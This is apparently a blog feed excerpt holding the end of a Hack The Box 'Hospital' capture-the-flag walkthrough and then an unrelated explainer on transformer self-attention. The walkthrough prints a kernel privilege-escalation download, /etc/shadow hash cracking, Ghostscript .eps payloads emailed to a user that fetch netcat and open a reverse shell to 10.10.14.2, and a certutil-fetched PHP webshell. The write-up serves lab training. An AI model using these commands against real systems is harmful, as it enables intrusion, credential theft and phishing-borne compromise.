Linux webserver 5.19.0-35-generic <span class="c">#36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div></div> <h1 id="privilege-escalation">Privilege escalation</h1> <p>Searching the linux kernel version reveals a potential privilege escalation vulnerability as described <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">here</a></p> <p>The vulnerability is easily exploited by downloading the exploit, serving it and retrieving it on the target machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/CVE-2023-2640-CVE-2023-32629]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...

10.129.229.189 - - <span class="o">[</span>07/Apr/2024 21:54:22] <span class="s2">"GET /exploit.sh HTTP/1.1"</span> 200 -
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span>wget 10.10.14.2:80/exploit.sh
<span class="nt">--2024-04-08</span> 08:54:18--  http://10.10.14.2/exploit.sh
Connecting to 10.10.14.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 558 <span class="o">[</span>text/x-sh]
Saving to: ‘exploit.sh’

exploit.sh          100%[<span class="o">===================&gt;]</span>     558  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s

2024-04-08 08:54:19 <span class="o">(</span>95.0 MB/s<span class="o">)</span> - ‘exploit.sh’ saved <span class="o">[</span>558/558]

www-data@webserver:/var/www/html<span class="err">$</span>
</code></pre></div></div> <p>Running the exploit, returns a root shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span>bash exploit.sh
<span class="o">[</span>+] You should be root now
<span class="o">[</span>+] Type <span class="s1">'exit'</span> to finish and leave the house cleaned
root@webserver:/var/www/html#

</code></pre></div></div> <blockquote> <p><strong><em>Now would be a good time to create persistence with the root user.</em></strong></p> </blockquote> <h1 id="lateral-movement">Lateral movement</h1> <h2 id="stealing-and-cracking-hashes">Stealing and cracking hashes</h2> <p>Looking at <code class="language-plaintext highlighter-rouge">/etc/shadow</code>, there is a hash for the <code class="language-plaintext highlighter-rouge">root</code> and <code class="language-plaintext highlighter-rouge">drwilliams</code> accounts.</p> <p><img src="/assets/img/2024-hospital/hashes-found.png" alt="hashes-found.png" class="auto-resize"/></p> <p>Stealing the hashes and running them through Hashcat cracks the <code class="language-plaintext highlighter-rouge">drwilliams</code> one.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb-machines/hospital/credentials]
└─<span class="nv">$ </span>hashcat hashes /usr/share/wordlists/rockyou.txt
hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting <span class="k">in </span>autodetect mode
<span class="nv">$6$uWBSeTcoXXT</span>&lt;SNIP&gt;

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 <span class="o">(</span>sha512crypt <span class="nv">$6$,</span> SHA512 <span class="o">(</span>Unix<span class="o">))</span>
Hash.Target......: <span class="nv">$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w</span>/iItu5.Ohoz...W192y/
Time.Started.....: Sun Apr  7 22:04:47 2024 <span class="o">(</span>1 min, 3 secs<span class="o">)</span>
Time.Estimated...: Sun Apr  7 22:05:50 2024 <span class="o">(</span>0 secs<span class="o">)</span>
Kernel.Feature...: Pure Kernel
Guess.Base.......: File <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
Speed.#1.........:     3366 H/s <span class="o">(</span>3.58ms<span class="o">)</span> @ Accel:1024 Loops:64 Thr:1 Vec:4
Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
Progress.........: 215040/14344385 <span class="o">(</span>1.50%<span class="o">)</span>
Rejected.........: 0/215040 <span class="o">(</span>0.00%<span class="o">)</span>
Restore.Point....: 214016/14344385 <span class="o">(</span>1.49%<span class="o">)</span>
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidate.Engine.: Device Generator
Candidates.#1....: raycharles -&gt; pakimo
Hardware.Mon.#1..: Util: 93%

Started: Sun Apr  7 22:04:28 2024
Stopped: Sun Apr  7 22:05:52 2024
</code></pre></div></div> <h2 id="business-email-compromise-1">Business email compromise</h2> <p>Now with Dr. William’s credentials, other services can be explored revealed in the initial scan, such as a webmail service running on Port 443.</p> <p><img src="/assets/img/2024-hospital/webservice.png" alt="webservice.png" class="auto-resize"/></p> <p>Trying Dr. Williams’ credentials is successful and access is obtained to the email account.</p> <p>An email in the inbox hints at another potential vector.</p> <p><img src="/assets/img/2024-hospital/email.png" alt="email.png" class="auto-resize"/></p> <h2 id="windows-movement">Windows movement</h2> <p>A google for <code class="language-plaintext highlighter-rouge">GhostScript</code> and <code class="language-plaintext highlighter-rouge">.eps</code> reveals another potential vector in the form of a remote code execution via a command injection.</p> <ul> <li><a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection">jakabakos/CVE-2023-36664-Ghostscript-command-injection: Ghostscript command injection vulnerability PoC (CVE-2023-36664) (github.com)</a></li> </ul> <p>It seems the vector is to create a payload that exploited the vulnerability in the GhostScript software, and send it back to Dr. Brown to move over to that user’s machine..</p> <p>The payload is crafted by creating a malicious <code class="language-plaintext highlighter-rouge">.eps</code> file and appending a command to it. This appears to be a method that will break out into the Windows layer, as presumably Dr. Brown will read the email and open the file on a Windows machine.</p> <p>Proceeding with this theory, the Windows version of Netcat (<code class="language-plaintext highlighter-rouge">nc64.exe</code>) is required, and palced in the same directory as the exploit. A payload is created that retrieves the <code class="language-plaintext highlighter-rouge">nc64.exe</code> from a webserver</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/CVE-2023-36664-Ghostscript-command-injection]
└─<span class="nv">$ </span>python3 CVE_2023_36664_exploit.py <span class="nt">--inject</span> <span class="nt">--payload</span> <span class="s2">"curl 10.10.14.2:8000/nc64.exe -o nc.exe"</span> <span class="nt">--filename</span> new-design.eps
<span class="o">[</span>+] Payload successfully injected into new-design.eps.
</code></pre></div></div> <p>The binary is then served and the malicious file sent back to Dr. Brown.</p> <p><img src="/assets/img/2024-hospital/Send-netcat.png" alt="Send-netcat.png" class="auto-resize"/></p> <p>A few moments later, the <code class="language-plaintext highlighter-rouge">nc64.exe</code> binary was successfully retrieved from the server, indicating Dr. Brown has opened the malicious <code class="language-plaintext highlighter-rouge">.eps</code> file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/CVE-2023-36664-Ghostscript-command-injection]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 8000
Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
10.129.229.189 - - <span class="o">[</span>07/Apr/2024 22:36:03] <span class="s2">"GET /nc64.exe HTTP/1.1"</span> 200 -
</code></pre></div></div> <p>A second payload is now crafted that will make use of the <code class="language-plaintext highlighter-rouge">nc64.exe</code> binary, and establish a reverse shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/CVE-2023-36664-Ghostscript-command-injection]
└─<span class="nv">$ </span>python3 CVE_2023_36664_exploit.py <span class="nt">--inject</span> <span class="nt">--payload</span> <span class="s2">"nc.exe 10.10.14.2 1234 -e cmd.exe"</span> <span class="nt">--filename</span> file.eps
<span class="o">[</span>+] Payload successfully injected into file.eps.
</code></pre></div></div> <p>The second payload is sent via email as well.</p> <p><img src="/assets/img/2024-hospital/email-payload.png" alt="email-payload.png" class="auto-resize"/></p> <p>Then, a reverse shell is successfully caught, providing access to Dr. Brown’s Windows machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/CVE-2023-36664-Ghostscript-command-injection]
└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 1234
listening on <span class="o">[</span>any] 1234 ...
connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.229.189] 25203
Microsoft Windows <span class="o">[</span>Version 10.0.17763.4974]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;whoami
<span class="nb">whoami
</span>hospital<span class="se">\d</span>rbrown

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments

04/08/2024  05:28 AM    &lt;DIR&gt;          <span class="nb">.</span>
04/08/2024  05:28 AM    &lt;DIR&gt;          ..
10/23/2023  03:33 PM               373 ghostscript.bat
04/08/2024  05:28 AM            45,272 nc.exe
               2 File<span class="o">(</span>s<span class="o">)</span>         45,645 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   4,082,790,400 bytes free

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;

</code></pre></div></div> <p>The user flag is found.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL&gt;cd Desktop
<span class="nb">cd </span>Desktop

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop

10/27/2023  12:24 AM    &lt;DIR&gt;          <span class="nb">.</span>
10/27/2023  12:24 AM    &lt;DIR&gt;          ..
04/08/2024  05:18 AM                34 user.txt
               1 File<span class="o">(</span>s<span class="o">)</span>             34 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   4,082,765,824 bytes free

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt;cat user.txt
<span class="nb">cat </span>user.txt
<span class="s1">'cat'</span> is not recognized as an internal or external <span class="nb">command</span>,
operable program or batch file.

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt;type user.txt
<span class="nb">type </span>user.txt
&lt;REDACTED&gt;

</code></pre></div></div> <h2 id="privilege-escalation---windows">Privilege escalation - Windows</h2> <p>On Dr Brown’s machine is a bat file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments

04/08/2024  05:28 AM    &lt;DIR&gt;          <span class="nb">.</span>
04/08/2024  05:28 AM    &lt;DIR&gt;          ..
10/23/2023  03:33 PM               373 ghostscript.bat
04/08/2024  05:28 AM            45,272 nc.exe
               2 File<span class="o">(</span>s<span class="o">)</span>         45,645 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   4,082,753,536 bytes free

</code></pre></div></div> <p>Reviewing the file reveals a hardcoded password.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\drbrown.HOSPITAL\Documents</span><span class="err">&gt;</span><span class="nx">type</span><span class="w"> </span><span class="nx">ghostscript.bat</span><span class="w">
</span><span class="kr">type</span><span class="w"> </span><span class="n">ghostscript.bat</span><span class="w">
</span><span class="err">@</span><span class="nx">echo</span><span class="w"> </span><span class="nx">off</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">filename</span><span class="o">=%</span><span class="n">~1</span><span class="w">
</span><span class="nx">powershell</span><span class="w"> </span><span class="nt">-command</span><span class="w"> </span><span class="s2">"</span><span class="nv">$p</span><span class="s2"> = convertto-securestring '&lt;REDACTED&gt;' -asplain -force;</span><span class="nv">$c</span><span class="s2"> = new-object system.management.automation.pscredential('hospital\drbrown', </span><span class="nv">$p</span><span class="s2">);Invoke-Command -ComputerName dc -Credential </span><span class="nv">$c</span><span class="s2"> -ScriptBlock { cmd.exe /c "</span><span class="nx">C:\Program</span><span class="se">` </span><span class="nx">Files\gs\gs10.01.1\bin\gswin64c.exe</span><span class="s2">" -dNOSAFER "</span><span class="nx">C:\Users\drbrown.HOSPITAL\Downloads\</span><span class="o">%</span><span class="nx">filename</span><span class="o">%</span><span class="s2">" }"</span><span class="w">

</span></code></pre></div></div> <p>The password can be tried on potential other services; for instance, RPC.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Password for [WORKGROUP\drbrown]:
rpcclient $&gt;
</code></pre></div></div> <p><strong><em>A note on RPC</em></strong></p> <ul> <li>Remote Procedure Call (RPC) is a protocol that allows a program on one computer to execute a procedure (a subroutine or function) on another computer without needing to understand the network’s details. In essence, RPC abstracts the complexities of network communication, allowing developers to focus on the implementation of the function rather than the communication mechanism. This is particularly useful in distributed systems, where different parts of an application may reside on different networked computers.</li> <li>RPC operates on a client-server model. The client makes a request for a procedure to be executed on the server. The RPC system then takes care of packaging the procedure’s parameters, sending them over the network to the server, executing the requested procedure on the server with the supplied parameters, and then sending the result back to the client.</li> </ul> <p>Once the RPC shell is established, executing <code class="language-plaintext highlighter-rouge">querydispinfo</code> will return a description of the various users on the target machine.</p> <p><img src="/assets/img/2024-hospital/rpc.png" alt="rpc.png" class="auto-resize"/></p> <p>This reveals the presence of a local administrator account.</p> <p>Enumerating the directory structure further reveals the presence of the <code class="language-plaintext highlighter-rouge">xampp\htdocs</code> folder.</p> <p><strong>* A note on <code class="language-plaintext highlighter-rouge">xampp\htdocs</code></strong>*</p> <ul> <li>The <code class="language-plaintext highlighter-rouge">xampp\htdocs</code> folder is a directory used by XAMPP, a popular open-source cross-platform web server solution stack package. XAMPP stands for Cross-Platform (X), Apache (A), MariaDB (M), PHP (P), and Perl (P). It is designed to be an easy-to-install Apache distribution containing MariaDB, PHP, and Perl, making it a convenient tool for developers to create and test web applications on their local machines before deploying them to a live server.*</li> <li>If found on a machine in a production environment or accessible over a network, it could be a security concern. XAMPP is not designed with security in mind for production use; its default configuration is meant for development purposes only, with minimal security settings. An improperly secured XAMPP installation accessible over a network can be exploited by malicious actors.</li> </ul> <p>The permissions on the location reveal any user can read and execute to the location, and <code class="language-plaintext highlighter-rouge">NT Authority</code> has full control.</p> <p>A malicious file uploaded to the location could theoretically be executed in the context of <code class="language-plaintext highlighter-rouge">NT Authority</code>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; Get-Acl | Format-List

Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs
Owner  : BUILTIN<span class="se">\A</span>dministrators
Group  : HOSPITAL<span class="se">\D</span>omain Users
Access : NT AUTHORITY<span class="se">\L</span>OCAL SERVICE Allow  FullControl
         NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
         BUILTIN<span class="se">\U</span>sers Allow  ReadAndExecute, Synchronize
         BUILTIN<span class="se">\U</span>sers Allow  AppendData
         BUILTIN<span class="se">\U</span>sers Allow  CreateFiles
         CREATOR OWNER Allow  268435456
</code></pre></div></div> <p>The shell used earlier was re-used here. First it was served locally on the attack machine and then retrieved on the Windows target within the potentially vulnerable <code class="language-plaintext highlighter-rouge">htdocs</code> folder.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/p0wny-shell]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 8000
Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
</code></pre></div></div> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\xampp\htdocs</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">certutil</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">http://10.10.14.2:8000/shell.php</span><span class="w"> </span><span class="nx">shell.php</span><span class="w">
</span></code></pre></div></div> <p>Browsing to the uploaded shell on the Windows machine successfully obtains another webshell in the context of the <code class="language-plaintext highlighter-rouge">NT Authority</code> user.</p> <p>The root flag is found.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DC</span><span class="err">$@</span><span class="nx">DC:C:\xampp\htdocs</span><span class="c"># whoami</span><span class="w">
</span><span class="n">nt</span><span class="w"> </span><span class="nx">authority\system</span><span class="w">

</span><span class="n">DC</span><span class="err">$@</span><span class="nx">DC:C:\xampp\htdocs</span><span class="c"># type c:\Users\Administrator\Desktop\root.txt</span><span class="w">
</span><span class="err">&lt;</span><span class="n">REDACTED</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="medium-box"/><category term="HTB"/><category term="insecure-file-upload"/><category term="weak-credentials"/><category term="unpatched"/><category term="command-injection"/><category term="remote-code-execution"/><category term="insecure-coding"/><category term="inappropriate-file-permissions"/><category term="local-administrator"/><category term="phar"/><category term="php"/><category term="eps"/><summary type="html"><![CDATA[Hospital - Hack The Box walkthrough.]]></summary></entry><entry><title type="html">An overview of Transformer architecture and self-attention</title><link href="https://emdeh.github.io/blog/2024/transformer-architecture-and-self-attention/" rel="alternate" type="text/html" title="An overview of Transformer architecture and self-attention"/><published>2024-03-18T23:50:00+00:00</published><updated>2024-03-18T23:50:00+00:00</updated><id>https://emdeh.github.io/blog/2024/transformer-architecture-and-self-attention</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/transformer-architecture-and-self-attention/"><![CDATA[<p>In Natural Language Processing (NLP), a transformer architecture is a type of deep learning model that has significantly improved the ability to understand and generate human language. Vaswani et al. introduced transformers in the paper “Attention is All You Need” in 2017 and distinguished them by their application of self-attention mechanisms. Self-attention mechanisms enable a model to weigh the importance of different words within a sentence, regardless of their positional distance from each other.</p> <p><strong><em>Key Features of Transformers</em></strong></p> <ul> <li><strong>Self-Attention:</strong> allows the model to dynamically focus on different parts of an input as it processes information, enabling it to effectively capture context and relationships between words.</li> <li><strong>Parallel Processing:</strong> Transformers can process entire sequences of data in parallel, which significantly speeds up training and improves the model’s ability to handle long sequences. Previous sequence models like RNNs (Recurrent Neural Networks) and LSTMs (Long-Short-Term Memory Networks) could only process data sequentially.</li> <li><strong>Layered Structure:</strong> Transformers comprise multiple layers of self-attention and feed-forward neural networks. A layered structure enables Transformers to learn complex patterns and relationships in the data, which is critical to the depth of their performance on a broad range of NLP tasks.</li> <li><strong>Scalability:</strong> Due to parallel processing and efficient training on large datasets, transformers are highly scalable, making them suitable for cases requiring an understanding of complex and nuanced language.</li> </ul> <p><strong><em>Applications</em></strong></p> <p>Many state-of-the-art NLP models, such as BERT (Bidirectional Encoder Representations from Transformers) and GPT (Generative Pretrained Transformer), have a Transformer foundation. These models have set new benchmarks in various NLP tasks, such as text classification, machine translation, question answering, and text generation.</p> <p>The transformer model’s ability to understand context and nuance in text has enabled the development of more sophisticated and interactive AI applications, and it is a cornerstone of modern NLP research.</p> <h1 id="the-architecture">The architecture</h1> <p><br/> Transformer architectures have three broad models:</p> <ul> <li>Encoders</li> <li>Decoders, and</li> <li>Encoder-Decoders (Sequence-to-Sequence)</li> </ul> <h2 id="encoders">Encoders</h2> <p>Encoders in transformers process input text into a format (vector representations) that captures the essence of the original information.</p> <blockquote> <p><strong><em>Encoder models are bidirectional.</em></strong></p> </blockquote> <p>Because encoders consider the context from both before and after a given word within the same layer, they are said to be <strong>bi-directional</strong>. Bi-directional capability contrasts with traditional models that process input in a strict uni-directional sequence (either left-to-right or right-to-left). Thus, it could only incorporate context from one direction at a time in their initial layers.</p> <p>Imagine the sentence, <em><code class="language-plaintext highlighter-rouge">The cat sat on the mat.</code></em> Bidirectionality means that when processing the word <em><code class="language-plaintext highlighter-rouge">sat</code></em>, the encoder considers the context of <em><code class="language-plaintext highlighter-rouge">The cat</code></em> (words before <em><code class="language-plaintext highlighter-rouge">sat</code></em>) and <em><code class="language-plaintext highlighter-rouge">on the mat</code></em> (words after <em><code class="language-plaintext highlighter-rouge">sat</code></em>) simultaneously. This allows the encoder to understand that <em><code class="language-plaintext highlighter-rouge">sat</code></em> is an action performed by <em><code class="language-plaintext highlighter-rouge">the cat</code></em> and it occurred <em><code class="language-plaintext highlighter-rouge">on the mat</code></em>, integrating full-sentence context into its representation of <em><code class="language-plaintext highlighter-rouge">sat</code></em>.</p> <p>In contrast, <strong>unidirectional</strong> models, such as decoders (see below), would only consider “<em><code class="language-plaintext highlighter-rouge">The cat</code></em> when first encountering <em><code class="language-plaintext highlighter-rouge">sat</code></em>, meaning it misses the contextual clues provided by <em><code class="language-plaintext highlighter-rouge">on the mat</code></em> until later layers, or not at all, depending on the model’s overall architecture.</p> <p>Bi-directional processing enables transformers to capture a more nuanced and complete understanding of language, which makes them particularly effective for tasks that require a deep understanding of context, such as sentence classification, sentiment analysis, and named entity recognition.</p> <blockquote> <p><strong><em>Encoders use self-attention layers to understand relative context.</em></strong></p> </blockquote> <p>Encoders in transformer models aim to evaluate and understand each part of the input text relative to the entire text. This is achieved by first converting each word or part of the input into a vector representation using embeddings. For each of these vector representations, the model generates three distinct vectors: <em>Query <code class="language-plaintext highlighter-rouge">(Q)</code></em>, <em>Key <code class="language-plaintext highlighter-rouge">(K)</code></em>, and <em>Value <code class="language-plaintext highlighter-rouge">(V)</code></em>. The <code class="language-plaintext highlighter-rouge">Q</code>, <code class="language-plaintext highlighter-rouge">K</code>, and <code class="language-plaintext highlighter-rouge">V</code> vectors are then utilised to calculate attention scores, determining the weight each word’s representation should assign to every other word’s representation in the input. This weighting process enables the model to determine how much ‘attention’ or importance each part of the input should give to other parts, effectively allowing each word to consider the context provided by the entire input. This mechanism, known as <strong>self-attention</strong>, is pivotal for the model’s ability to capture and utilise contextual information within the input.</p> <p>Encoder-only models are often used in tasks that require an understanding of the input, like sentence classification or named entity recognition.</p> <h2 id="decoders">Decoders</h2> <blockquote> <p><strong><em>Decoders use a masked self-attention layer.</em></strong></p> </blockquote> <p>Self-attention in decoders is said to be <strong>masked</strong>. Masking prevents a decoder from ‘seeing’ future parts of the sequence during training, ensuring each word prediction is based only on already generated words. In other words, during the generation of an output sequence, each position can only attend to positions that preceded the current position in the sequence. This constraint is crucial for text generation, where models predict the next word based on the previous ones.</p> <p>For example, imagine the decoder is generating the text <em><code class="language-plaintext highlighter-rouge">The quick brown fox.</code></em> When it’s predicting the word after <em><code class="language-plaintext highlighter-rouge">The quick,</code></em> the masked self-attention mechanism allows the decoder to consider <em><code class="language-plaintext highlighter-rouge">The</code></em> and <em><code class="language-plaintext highlighter-rouge">quick</code></em> but not <em><code class="language-plaintext highlighter-rouge">brown</code></em> or <em><code class="language-plaintext highlighter-rouge">fox</code></em> because those words are in the future relative to the current position being predicted. This masking effectively enforces a uni-directional flow of information, ensuring that the model generates each word based solely on preceding words, preserving the natural order of text generation.</p> <blockquote> <p><strong><em>Because of masked self-attention, decoders are uni-directional.</em></strong></p> </blockquote> <p>They generate output one element at a time in a forward direction. In decoders, the future context is deliberately obscured to mimic the process of creating language one word at a time, making the decoding process fundamentally uni-directional.</p> <p>If decoders were not uni-directional and could instead attend to the entire input sequence indiscriminately (similar to encoders), the integrity of the generated output sequence would be compromised. Specifically, the following issues could arise:</p> <ul> <li><em>Loss of Sequential Generation Logic:</em> Predicting the next word becomes moot if the decoder has access to future words, undermining the process of sequential text generation.</li> <li><em>Incoherent or Circular Outputs:</em> Due to premature knowledge of future context, outputs might repeat or loop without a logical progression.</li> <li><em>Compromised Learning Objective:</em> The model’s focus shifts from generating text based on learned structures to merely matching patterns, diluting the essence of language generation.</li> </ul> <blockquote> <p><strong><em>The generation of each element of the output sequence one at a time is Auto-Regression.</em></strong></p> </blockquote> <p>Generated each element of the output one at a time, based on the previously generated elements, is known as <strong>Auto-Regression</strong>. The auto-regressive property necessitates the use of masked self-attention in the decoder, as it relies on the premise that each step in the generation process only has access to previous steps.</p> <p>In summary, decoders are <em>uni-directional</em> because their <em>self-attention</em> layer is masked. Masking supports the <em>auto-regressive</em> nature of the generation process, ensuring that each step in generating the output can only use information from the steps that have already occurred.</p> <p>Decoder-only models are particularly useful at generative tasks, like text generation.</p> <h2 id="encoders-decoders">Encoders-decoders</h2> <p>Are also known as <strong>sequence-to-sequence</strong>. These models are good for generative tasks that are based on an input, such as translation or summarisation.</p> <h1 id="self-attention-layers">Self-Attention Layers</h1> <p><strong>Attention layers</strong> refers to any layer within a neural network that applies some form of the <em>attention mechanism</em>. Attention mechanisms allow models to focus on different parts of the input data with varying degrees of emphasis.</p> <blockquote> <p><strong><em>Self-Attention is one type of attention mechanism.</em></strong></p> </blockquote> <p>Self-Attention in transformer models enables each position in the input sequence to attend to all positions within the same sequence. Self-Attention enables transformers to process and interpret sequences of input data, such as sentences in natural language processing (NLP) and dynamically weigh the relevance of all parts of the input data against every other part when processing any single part, enabling the incorporation of relatively weighted context from the entire sequence.</p> <p>In other words, self-attention allows a model to understand the relationships between words, regardless of their positional distance. Here’s a more detailed look at how self-attention works:</p> <p>For example, imagine the sentence: <em><code class="language-plaintext highlighter-rouge">The cat purrs.</code></em></p> <p><strong>Step 1 - Input representation</strong><br/> First, each word in the sentence (<em><code class="language-plaintext highlighter-rouge">The</code></em>, <em><code class="language-plaintext highlighter-rouge">cat</code></em>, <em><code class="language-plaintext highlighter-rouge">purrs</code></em>) is converted into a vector using embeddings. These vectors contain each word’s initial context.</p> <p><strong>Step 2 - Query, Key, and Value Vectors</strong><br/> For each word, three vectors are generated from its embedding: a Query vector (<code class="language-plaintext highlighter-rouge">Q</code>), a Key vector (<code class="language-plaintext highlighter-rouge">K</code>), and a Value vector (<code class="language-plaintext highlighter-rouge">V</code>). This is done through linear transformations, which essentially means multiplying the word’s embedding by different weight matrices for <code class="language-plaintext highlighter-rouge">Q</code>, <code class="language-plaintext highlighter-rouge">K</code>, and <code class="language-plaintext highlighter-rouge">V</code>.</p> <p><strong>Step 3 - Calculating attention scores</strong><br/> The “dot product” of the Query vector for <code class="language-plaintext highlighter-rouge">purrs</code> is calculated with the Key vector of every word in the sentence, including itself. Calculating the dot product with the Key vector (<code class="language-plaintext highlighter-rouge">K</code>) of every other word produces scores that represent how much attention <code class="language-plaintext highlighter-rouge">purrs</code> should pay to each word in the sentence, including <code class="language-plaintext highlighter-rouge">The</code> and <code class="language-plaintext highlighter-rouge">cat</code>.</p> <p><strong>Step 4 - Softmax to Determine Weights</strong><br/> These scores converted into weights that sum to 1 through a mathematical normalisation process (a softmax function). The weights quantify the relevance of each word’s information to the word <code class="language-plaintext highlighter-rouge">purrs</code>.</p> <p><strong>Step 5 - Weighted Sum and Output</strong><br/> The weights are used to create a weighted sum of the Value vectors, which incorporates information from the entire sentence into the representation of <code class="language-plaintext highlighter-rouge">purrs</code>. For instance, the high weight of <code class="language-plaintext highlighter-rouge">cat</code> (since it’s directly related to <code class="language-plaintext highlighter-rouge">purrs</code>) ensures that <code class="language-plaintext highlighter-rouge">purrs</code> is understood in the context of <em><code class="language-plaintext highlighter-rouge">The cat</code></em>, reinforcing that it’s the cat doing the purring.</p> <blockquote> <p><strong><em>The result is contextual representation.</em></strong></p> </blockquote> <p>Thanks to the self-attention mechanism, the output vector for “purrs” now contains information about the word itself and how it relates to the other words in the sentence.</p> <p>This process is repeated for every word, enabling the encoder to understand and represent each word in the context of the entire sentence. Through this mechanism, transformers achieve a deep understanding of the text, considering the meaning of individual words and their broader context within the sentence.</p> <p>So clever.</p> <h4 id="sources">Sources</h4> <ul> <li>Self-Attention is all you need</li> <li>Wikipedia</li> <li>Huggingface.co NLP Course</li> </ul>]]></content><author><name></name></author><category term="Artificial-Intelligence"/><category term="transformers"/><category term="transformer-architecture"/><category term="self-attention"/><category term="encoders"/><category term="decoders"/><category 